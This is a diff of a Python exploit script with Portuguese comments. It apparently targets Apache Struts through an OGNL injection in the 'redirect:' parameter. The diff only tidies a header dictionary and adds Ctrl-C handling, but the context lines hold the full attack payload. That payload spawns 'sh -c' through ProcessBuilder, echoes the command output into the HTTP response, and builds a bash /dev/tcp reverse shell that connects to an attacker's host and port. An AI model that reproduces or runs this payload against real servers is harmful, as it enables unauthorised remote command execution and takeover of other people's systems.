@@ -22,12 +22,9 @@ port = str(args.lport)
 target = str(args.target)
 
 #Variáveis
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
-
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
 a = target + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
 b = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
-
 reverse = urllib.parse.quote(f'printf "bash -i >& /dev/tcp/{ip}/{port} 0>&1" > /tmp/rev.sh | bash', safe='')
 
 def banner() -> str: #PrintBanner
@@ -74,7 +71,10 @@ def interactive():
 
 if args.cmd:
     banner()
-    interactive()
+    try:
+        interactive()
+    except KeyboardInterrupt:
+        print('\nExiting...')
 elif args.lhost:
     banner()
     print(f'\nRunning ReverseShell from {target} to {ip}:{port}')
